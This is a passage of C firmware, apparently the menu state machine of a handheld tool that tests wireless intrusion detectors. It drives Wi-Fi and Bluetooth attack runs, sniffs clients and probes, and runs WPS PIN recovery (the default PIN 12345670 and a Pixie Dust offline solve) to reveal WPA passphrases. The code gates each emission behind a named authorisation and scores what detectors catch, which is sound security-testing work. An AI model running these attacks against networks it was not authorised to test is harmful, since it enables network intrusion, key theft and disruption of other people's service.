                        if (released && (tapped || pressed)) {
                            aborted = true;
                            break;
                        }
                        vTaskDelay(pdMS_TO_TICKS(100));
                    }
                }
                if (aborted) {
                    bas_ui_note("ABORTED", "Nothing was sent.", NULL, TH_INK3);
                    vTaskDelay(pdMS_TO_TICKS(1500));
                    role = BAS_ROLE_OPERATOR;
                    st_cur = ST_ATTACKS;
                    redraw = true;
                    break;
                }

                tx_ctx_t ctx = { .f = f, .budget = bas_plan_frame_budget(&plan) };
                s_abort = false;
                run_idx = bas_card_begin(&s_card, f, now_ms(),
                                         BAS_GRACE_DEFAULT_MS);
                s_scoring_run = run_idx;

                bas_tx_result_t res;
                esp_err_t rc = bas_tx_run(&plan, &s_engage, role, tx_tick,
                                          &ctx, &res);
                run_frames = res.frames_sent;
                if (run_idx >= 0) {
                    bas_card_end(&s_card, run_idx, now_ms(), res.frames_sent);
                }
                bas_sdlog_run(&s_engage, f, &plan, &res, NULL);
                bas_engage_note_run(&s_engage);
                role = BAS_ROLE_OPERATOR;

                if (rc != ESP_OK) {
                    bas_ui_note("REFUSED", esp_err_to_name(rc),
                                bas_err_str(res.stopped_by), TH_STOP);
                    vTaskDelay(pdMS_TO_TICKS(2500));
                    st_cur = ST_ATTACKS;
                } else if (res.frames_sent == 0u) {
                    /* Discard rather than let it age into a MISSED that blames
                     * the detector for the transmitter's failure. */
                    ESP_LOGW(TAG, "run discarded: 0 sent, %u rejected",
                             (unsigned)res.tx_errors);
                    if (run_idx >= 0 && run_idx == (int)s_card.count - 1) {
                        s_card.count--;
                        memset(&s_card.r[run_idx], 0, sizeof(s_card.r[run_idx]));
                        run_idx = -1;
                    }
                    bas_ui_tx_failed(f, &res);
                    vTaskDelay(pdMS_TO_TICKS(400));
                    while (input_poll() == EV_NONE) {
                        uint16_t ax, ay;
                        if (ui_tap(&ax, &ay)) { break; }
                        vTaskDelay(pdMS_TO_TICKS(40));
                    }
                    st_cur = ST_ATTACKS;
                } else {
                    ask_until = now_ms() + BAS_GRACE_DEFAULT_MS;
                    st_cur = ST_ASK;
                }
                redraw = true;
            }
            break;
        }

        case ST_ASK: {
            poll_uart_alarms();
            /* A machine-reported alarm ends the wait at once: the question has
             * been answered and there is nothing for the operator to add. */
            if (run_idx >= 0 && s_card.r[run_idx].alarm_seen) {
                bas_sdlog_verdict(&s_engage, &s_card.r[run_idx], now_ms());
                s_scoring_run = -1;
                st_cur = ST_RESULTS;
                redraw = true;
                break;
            }
            uint32_t t = now_ms();
            uint32_t left = (t < ask_until) ? ask_until - t : 0u;
            bas_ui_ask(cur_fams[atk_sel], run_frames, left);
            if ((tap || accept) && run_idx >= 0) {
                bas_card_alarm(&s_card, run_idx, "operator", 0, 0,
                               BAS_SRC_OPERATOR, now_ms());
                bas_sdlog_verdict(&s_engage, &s_card.r[run_idx], now_ms());
                st_cur = ST_RESULTS;
            } else if (back || left == 0u) {
                /* No alarm inside the grace window. The scorecard reads MISSED
                 * only now, never the instant the burst ended. */
                if (run_idx >= 0) {
                    bas_sdlog_verdict(&s_engage, &s_card.r[run_idx], now_ms());
                }
                s_scoring_run = -1;
                st_cur = ST_RESULTS;
            }
            redraw = true;
            break;
        }

        case ST_RESULTS:
            if (redraw) { bas_ui_results(&s_card, now_ms()); redraw = false; }
            if (tap || accept || back) { st_cur = ST_HOME; redraw = true; }
            break;

        case ST_BLE: {
            bool sc = bas_ble_scanning();
            int bn = 0;
            (void)bas_ble_devices(&bn);
            char b0[40], b1[40];
            snprintf(b0, sizeof(b0), sc ? "%d seen, listening" : "start the radio", bn);
            snprintf(b1, sizeof(b1), "%s", s_engage.locked ? "advert spam, tracker dwell"
                                                           : "lock a target first");
            rows[0] = (bas_row_t){ sc ? "Stop scanning" : "Scan devices",
                                   b0, 0, true };
            rows[1] = (bas_row_t){ "Devices", sc || bn ? "what is advertising"
                                                       : "scan first", 0, bn > 0 };
            /* Always reachable. Selecting it without an engagement goes
             * straight to the authorisation, rather than sitting greyed out
             * and sending the operator to the Wi-Fi section to lock a network
             * that Bluetooth does not use. */
            rows[2] = (bas_row_t){ "Attacks",
                                   s_engage.locked ? b1
                                                   : "name the authorisation first",
                                   0, true };
            /* BLE addresses nobody, so it needs an authorisation but not a
             * network. Making the operator pick a Wi-Fi target in order to
             * authorise a Bluetooth emission was incoherent, and made this
             * section look broken until Wi-Fi had been visited first. */
            rows[3] = (bas_row_t){ "Authorise this work",
                                   s_engage.locked ? s_engage.label
                                                   : "name it, no network needed",
                                   0, !s_engage.locked };
            if (redraw) {
                bas_ui_list("Bluetooth", NULL, rows, 4, ble_sel,
                            "LEFT open   hold LEFT back");
                redraw = false;
            }
            if (next) { ble_sel = (ble_sel + 1) % 4; redraw = true; }
            if (back) { st_cur = ST_HOME; redraw = true; break; }
            int hit = tap ? bas_ui_list_hit(tx, ty, ble_sel, 4) : -1;
            if (hit >= 0) {
                if (hit == ble_sel) { accept = true; }
                else { ble_sel = hit; redraw = true; }
            }
            if (accept && rows[ble_sel].enabled) {
                switch (ble_sel) {
                case 0:
                    if (sc) { bas_ble_scan_stop(); }
                    else    { bas_ble_scan_reset(); bas_ble_scan_start(); }
                    break;
                case 1: bdev_sel = 0; st_cur = ST_BLE_DEV; break;
                case 2:
                    cur_fams = BLE_FAMS;
                    cur_fam_n = BLE_FAM_N;
                    atk_sel = 0;
                    if (!s_engage.locked) {
                        /* Straight to the keyboard: BLE addresses nobody, so
                         * a label is the only thing it needs. */
                        label[0] = '\0';
                        label_is_area = true;
                        st_cur = ST_LABEL;
                    } else {
                        st_cur = ST_ATTACKS;
                    }
                    break;
                case 3:
                    label[0] = '\0';
                    label_is_area = true;
                    st_cur = ST_LABEL;
                    break;
                default: break;
                }
                redraw = true;
            }
            break;
        }

        case ST_BLE_DEV: {
            int bn = 0;
            const bas_ble_dev_t *bd = bas_ble_devices(&bn);
            /* Redrawn every pass rather than on change: this list is live and
             * a device arriving is the thing the operator is waiting for. */
            bas_ui_ble_devices(bd, bn, bdev_sel,
                               bas_ble_longest_tracker_dwell(now_ms()));
            if (back) { st_cur = ST_BLE; redraw = true; break; }
            if (next && bn) { bdev_sel = (bdev_sel + 1) % bn; redraw = true; }
            int hit = tap ? bas_ui_list_hit(tx, ty, bdev_sel, bn) : -1;
            if (hit >= 0) { bdev_sel = hit; }
            if (accept) { st_cur = ST_BLE; redraw = true; }
            break;
        }

        case ST_RECON: {
            bool on = bas_sniff_active();
            rows[0] = (bas_row_t){ "Channel analyser",
                                   on ? "listening" : "start the receiver",
                                   0, true };
            rows[1] = (bas_row_t){ "Frame monitor",
                                   on ? "what is on air" : "needs the receiver",
                                   0, on };
            rows[2] = (bas_row_t){ "Clients",
                                   on ? "devices seen on air"
                                      : "needs the receiver", 0, on };
            rows[3] = (bas_row_t){ "Probes",
                                   on ? "names devices are asking for"
                                      : "needs the receiver", 0, on };
            rows[4] = (bas_row_t){ "WPS exposure",
                                   "graded from beacons, sends nothing",
                                   0, s_scan.count > 0 };
            rows[5] = (bas_row_t){ on ? "Stop listening" : "Start listening",
                                   on ? "release the radio"
                                      : "receive-only, hops the band",
                                   0, true };
            if (redraw) {
                bas_ui_list("Recon", on ? "live" : NULL, rows, 6, recon_sel,
                            "LEFT open   hold LEFT back");
                redraw = false;
            }
            if (next) { recon_sel = (recon_sel + 1) % 6; redraw = true; }
            if (back) { st_cur = ST_HOME; redraw = true; break; }
            int hit = tap ? bas_ui_list_hit(tx, ty, recon_sel, 6) : -1;
            if (hit >= 0) {
                if (hit == recon_sel) { accept = true; }
                else { recon_sel = hit; redraw = true; }
            }
            if (accept && rows[recon_sel].enabled) {
                switch (recon_sel) {
                case 0:
                    if (!on) { bas_sniff_start(0); }
                    st_cur = ST_CHANNELS;
                    break;
                case 1: st_cur = ST_FRAMES; break;
                case 2:
                    if (s_engage.locked) {
                        bas_sniff_clients_of(s_engage.target.bssid, &clients);
                    } else {
                        clients = *bas_sniff_stations();
                        bas_sta_sort_rssi(&clients);
                    }
                    cli_sel = 0;
                    st_cur = ST_CLIENTS;
                    break;
                case 3: probe_sel = 0; st_cur = ST_PROBES; break;
                case 4: wps_sel = 0; st_cur = ST_WPS; break;
                case 5:
                    if (on) { bas_sniff_stop(); } else { bas_sniff_start(0); }
                    break;
                default: break;
                }
                redraw = true;
            }
            break;
        }

        case ST_WPS: {
            /* Only the networks that actually advertise WPS. A list padded
             * with the 36 that do not would bury the finding. */
            static int      idx[BAS_MAX_APS];
            static char     sub[10][40];
            int n = 0;
            for (unsigned i = 0; i < s_scan.count && n < BAS_MAX_APS; i++) {
                if (bas_wps_grade(&s_scan.ap[i].wps) != BAS_WPS_NONE) {
                    idx[n++] = (int)i;
                }
            }
            if (n == 0) {
                bas_ui_note("WPS exposure", "No network in range",
                            "advertises WPS.", TH_OK);
                if (back || accept || tap) { st_cur = ST_RECON; redraw = true; }
                break;
            }
            if (wps_sel >= n) { wps_sel = 0; }

            int shown = (n > 10) ? 10 : n;
            for (int i = 0; i < shown; i++) {
                const bas_ap_t *a = &s_scan.ap[idx[i]];
                bas_wps_risk_t r  = bas_wps_grade(&a->wps);
                snprintf(sub[i], sizeof(sub[i]), "ch%u %ddBm  %s",
                         (unsigned)a->channel, (int)a->rssi,
                         bas_wps_risk_name(r));
                rows[i] = (bas_row_t){
                    a->hidden ? "(hidden)" : a->ssid, sub[i],
                    /* Locked is the only WPS state that is not a live
                     * exposure, so it is the only one not marked. */
                    (r == BAS_WPS_LOCKED) ? TH_OK
                        : (r == BAS_WPS_PIN_OPEN || r == BAS_WPS_REGISTRAR)
                            ? TH_STOP : TH_WARN,
                    true };
            }
            if (redraw) {
                bas_ui_list("WPS exposure", NULL, rows, shown, wps_sel,
                            "LEFT recover   hold LEFT back");
                redraw = false;
            }
            if (back) { st_cur = ST_RECON; redraw = true; break; }
            if (next) { wps_sel = (wps_sel + 1) % shown; redraw = true; }
            int hit = tap ? bas_ui_list_hit(tx, ty, wps_sel, shown) : -1;
            if (hit >= 0) {
                if (hit == wps_sel) { accept = true; }
                else { wps_sel = hit; redraw = true; }
            }
            if (accept) {
                const bas_ap_t *a = &s_scan.ap[idx[wps_sel]];
                /* Recovery associates with the AP and is logged by it, so it
                 * needs the same authorisation as any other emission. The
                 * engagement must already name THIS network -- selecting a row
                 * here is not consent to attack it. */
                if (!s_engage.locked ||
                    !bas_mac_eq(a->bssid, s_engage.target.bssid)) {
                    bas_ui_note("Not authorised",
                                "Lock an engagement on",
                                "this network first.", TH_WARN);
                    vTaskDelay(pdMS_TO_TICKS(1800));
                    redraw = true;
                } else {
                    wps_from_wifi = false;
                    st_cur = ST_WPS_RUN;
                    redraw = true;
                }
            }
            break;
        }

        case ST_WPS_RUN: {
            /* One exchange, then the offline solve. Drawn before the work
             * starts because the exchange blocks for up to thirty seconds and
             * a frozen screen reads as a crash. */
            bas_ui_note("WPS recovery",
                        "One exchange, then",
                        "solving offline...", TH_WARN);

            static bas_wpsatk_result_t wr;
            memset(&wr, 0, sizeof(wr));
            (void)bas_wpsatk_try(12345670u, 30000u, &wr);

            if (wr.have_material) {
                bas_pixie_run(&wr.material, &wr.pixie);
            }

            /* A WPA passphrase runs to 63 characters. Sizing this to fit the
             * screen instead would silently truncate a recovered key, which
             * is worse than not recovering it: a half-key looks like an
             * answer. It is stored whole here; the console prints it whole. */
            static char l1[48], l2[72];
            if (wr.pixie.found) {
                static bas_wpsatk_result_t gr;
                memset(&gr, 0, sizeof(gr));
                snprintf(l1, sizeof(l1), "PIN %08u",
                         (unsigned)wr.pixie.pin);
                bas_ui_note("PIN recovered", l1, "redeeming...", TH_STOP);
                (void)bas_wpsatk_try(wr.pixie.pin, 30000u, &gr);
                if (gr.have_cred) {
                    snprintf(l2, sizeof(l2), "%s", gr.passphrase);
                    bas_ui_note("Key recovered", l1, l2, TH_STOP);
                } else {
                    bas_ui_note("PIN recovered", l1,
                                "no key returned", TH_STOP);
                }
            } else if (wr.have_cred) {
                snprintf(l1, sizeof(l1), "default PIN 12345670");
                snprintf(l2, sizeof(l2), "%s", wr.passphrase);
                bas_ui_note("Key recovered", l1, l2, TH_STOP);
            } else if (wr.have_material) {
                /* A real finding, and it must not read as a failure of the
                 * tool: the registrar's nonces were sound. */
                bas_ui_note("Not vulnerable", "Registrar nonces were",
                            "not predictable.", TH_OK);
            } else {
                bas_ui_note("No WPS exchange", "The AP did not answer",
                            "an enrollee.", TH_WARN);
            }
            /* Stay put until dismissed: a recovered key must not vanish while
             * the operator is reaching for a notebook. */
            if (back || accept || tap) {
                st_cur = wps_from_wifi ? ST_WIFI : ST_WPS;
                redraw = true;
            }
            break;
        }

        case ST_CHANNELS:
            /* Hop while this screen is up. Dwell is set here rather than in the
             * receiver, so the survey owns the trade between coverage and
             * confidence. */
            bas_sniff_hop(700);
            bas_ui_channels(bas_sniff_channels(), bas_sniff_current_channel());
            if (back || accept) { st_cur = ST_RECON; redraw = true; }
            break;

        case ST_FRAMES:
            bas_ui_frames(bas_sniff_frames(), bas_sniff_current_channel());
            if (back || accept) { st_cur = ST_RECON; redraw = true; }
            break;

        case ST_CLIENTS: {
            int n = (int)clients.count + 1;      /* row 0 is the bulk action */
            if (redraw) {
                bas_ui_clients(&clients, cli_sel, &s_engage);
                redraw = false;
            }
            if (back) { st_cur = ST_RECON; redraw = true; break; }
            if (next && n) { cli_sel = (cli_sel + 1) % n; redraw = true; }

            int hit = tap ? bas_ui_list_hit(tx, ty, cli_sel, n) : -1;
            if (hit >= 0) {
                if (hit == cli_sel) { accept = true; }
                else { cli_sel = hit; redraw = true; }
            }

            if (accept && clients.count > 0u) {
                if (!s_engage.locked || !s_engage.has_target) {
                    bas_ui_note("NO TARGET", "Lock a network first.",
                                "Clients belong to a cell.", TH_WARN);
                    vTaskDelay(pdMS_TO_TICKS(1800));
                    st_cur = ST_RECON;
                } else if (cli_sel == 0) {
                    /* The whole cell: every station associated with THIS
                     * network, including any that stayed silent through the
                     * survey and never appeared in the list. Scoped by the
                     * locked BSSID, so no other network is touched. */
                    bool on = bas_engage_is_whole_cell(&s_engage);
                    bas_err_t rc = bas_engage_set_whole_cell(&s_engage, !on);
                    if (rc != BAS_OK) {
                        bas_ui_note("REFUSED", bas_err_str(rc), NULL, TH_STOP);
                        vTaskDelay(pdMS_TO_TICKS(1600));
                    } else if (!on) {
                        bas_ui_note("WHOLE NETWORK",
                                    s_engage.target.ssid,
                                    "every client on this cell", TH_STOP);
                        vTaskDelay(pdMS_TO_TICKS(1600));
                    }
                } else if (bas_engage_is_whole_cell(&s_engage)) {
                    /* Picking one while the cell is chosen would imply a
                     * narrowing that is not happening. */
                    bas_ui_note("WHOLE NETWORK",
                                "Already covering every client.",
                                "Untick it to choose individually.", TH_WARN);
                    vTaskDelay(pdMS_TO_TICKS(1800));
                } else {
                    const uint8_t *mac = clients.s[cli_sel - 1].mac;
                    if (bas_engage_has_client(&s_engage, mac)) {
                        bas_engage_remove_client(&s_engage, mac);
                    } else {
                        bas_err_t rc = bas_engage_add_client(&s_engage, mac);
                        if (rc != BAS_OK) {
                            bas_ui_note("REFUSED", bas_err_str(rc), NULL,
                                        TH_STOP);
                            vTaskDelay(pdMS_TO_TICKS(1600));
                        }
                    }
                }
                redraw = true;
            }
            break;
        }

        case ST_PROBES: {
            int pn = 0;
            const bas_probe_t *pl = bas_sniff_probes(&pn);
            if (redraw) { bas_ui_probes(pl, pn, probe_sel); redraw = false; }
            if (back || accept) { st_cur = ST_RECON; redraw = true; break; }
            if (next && pn) { probe_sel = (probe_sel + 1) % pn; redraw = true; }
            int hit = tap ? bas_ui_list_hit(tx, ty, probe_sel, pn) : -1;
            if (hit >= 0) { probe_sel = hit; redraw = true; }
            break;
        }
        }

        vTaskDelay(pdMS_TO_TICKS(40));
    }
}
